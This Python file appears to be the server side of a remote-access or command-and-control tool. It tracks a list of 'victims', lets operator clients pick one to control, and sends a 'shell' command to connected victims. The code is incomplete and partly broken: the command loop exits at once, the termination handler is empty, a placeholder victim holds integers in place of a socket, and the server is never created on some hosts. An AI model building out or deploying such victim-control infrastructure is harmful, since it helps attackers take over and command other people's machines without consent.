import json
import socket
import ssl
import threading
import time
import sys
import logging

import tools.message as message
import tools.my_socket as my_socket

VERSION = 0.1


class victim():
    def __init__(self, hostname:str, version, sock, addr, in_use:bool):
        self._hostname = hostname
        self._version = version
        self._socket = sock
        self._addr = addr
        self.in_use = in_use
    
    @property
    def hostname(self):
        return self._hostname
    
    @property
    def version(self):
        return self._version
    
    @property
    def socket(self):
        return self._socket
    
    @property
    def addr(self):
        return self._addr
    

"""
    looks like this:
        [
            ["hostname", version, socket_object, addr, in_use:bool],
        ]
        in_use: True if this victim is currently in use by a client and cannot be connected
                to a new one. False if free
"""
victim_list:list = [victim("PC", 0.1, 1, 1, False)]

class client_handler():
    """
        handler for the clients which can take controll over the victims connect to
    """
    def __init__(self, sock:my_socket.my_socket, addr) -> None:
        self.client_socket:my_socket.my_socket = sock # connection to the client
        self.addr = addr
        self.victim_ref:victim = None # reference to the list in victim_list

    def open_connection(self) -> bool:
        """
            ``return`` True on success at establishing the connection. False on failure
        """
        msg = {
            "victim_list": [],
            "version": VERSION,
            "status_code": 0,
            "status_msg": ""
        }

        msg["version"] = VERSION

        for victim in victim_list:
            msg["victim_list"].append(victim.hostname)
        
        if not self.client_socket.send_msg(json.dumps(msg, indent=None)):
            self.client_socket.close() # if an error ocours at establishing the connnection - close - client should connect again
            logging.log(logging.DEBUG, F"ERROR at creating connection with client {self.addr} - closing")
            return False

        
        # we got the victim selection
        while self.victim_ref == None:      # until a valid victim was picked
            try:
                msg = self.client_socket.recv_msg() # the victim selection
            except BrokenPipeError as err:
                logging.log(logging.DEBUG, F"{str(err)} - connection broken to client {self.addr}")
                self.terminate()
            except Exception as err:
                logging.log(logging.WARNING, F"UNKOWN ERROR client connection - {str(err)}")
                self.terminate()

            victim_selection = msg.msg["victim_selection"]
            if len(victim_list) == 0:
                msg = {
                    "status_code": -1,
                    "status_msg": "no victim online"
                }
            else:
                for vict in victim_list:
                    if vict.hostname == victim_selection:
                        self.victim_ref = vict
                        self.victim_ref.in_use = True
                        print(vict)
                        msg = {
                            "victim_hostname": self.victim_ref.hostname,
                            "victim_version": self.victim_ref.version,
                            "status_code": 0,
                            "status_msg": F"victim \"{self.victim_ref.hostname}\" selected successfully"
                        }
                    else:
                        msg = {
                            "status_code": -1,
                            "status_msg": "no victim with given hostname"
                        }

            self.client_socket.send_msg(json.dumps(msg))
        
        return True

    def handle_prompt(self):
        msg = None

        # the loop of the commands...
        while True:
            break

    def handle_client(self):
        self.open_connection()
        self.handle_prompt()

    def terminate(self):
        """
            terminates this client handler thread
        """
        pass


def handle_server(conn:socket.socket, addr:socket.AddressInfo):
    m_socket = my_socket.my_socket(conn)
    json_msg = {"command": "shell","command_attr":[1,2,3,4,5,6]}

    msg = message.message(json_msg)
    if not m_socket.send_msg(msg):
        print("failed sending the message")

    try:
        msg = m_socket.recv_msg()
        print(F"recieved {str(msg)}")
    except BrokenPipeError as err:
        print(F"error recveiving data: {str(err)}", file=sys.stderr)
        with open("recv.json", "w") as file:
            file.write(str(msg))
            file.close()
    except Exception as err:
        print(F"UNEXPECTED ERROR: {str(err)}", file=sys.stderr)
    
    msg = m_socket.recv_msg()
    if msg == None:
        print("connection was closed by the client")
    
    return None


def handle_client(sock, addr):
    m_socket = my_socket.my_socket(sock)
    cl_handler = client_handler(m_socket, addr)
    cl_handler.handle_client()

if __name__ == "__main__":
    logging.basicConfig(filename="./log.log", level=logging.DEBUG)
    #connection = socket.create_server(("my.domain.com", 9090), handle_server)
    #connection.begin()
    
    server_hostname = ""
    server_port = 9090
    allowed_queue_clients = 10
    server:socket.socket = None

    if socket.has_dualstack_ipv6(): # supports IPv4 and IPv6
        server = socket.create_server((server_hostname, server_port), family=socket.AF_INET6, backlog=allowed_queue_clients, dualstack_ipv6=True)
    else:
        pass
        #server = socket.create_server((server_hostname, server_port), socket.AF_INET6, backlog=allowed_queue_clients, dualstack_ipv6=False)

    server.listen()

    client_threads = list()

    while True:
        (conn, addr) = server.accept()
        cl_handler = client_handler(conn, addr)
        thread = threading.Thread(target=handle_client, args=(conn, addr))
        thread.start()
        client_threads.append(thread)
        #handle_server(conn, addr)
        print(addr)

        print(len(client_threads))
        if len(client_threads) > 0:
            for thread in client_threads:
                if not thread.is_alive():
                    thread.join()
                    client_threads.remove(thread)
    

    server.close()
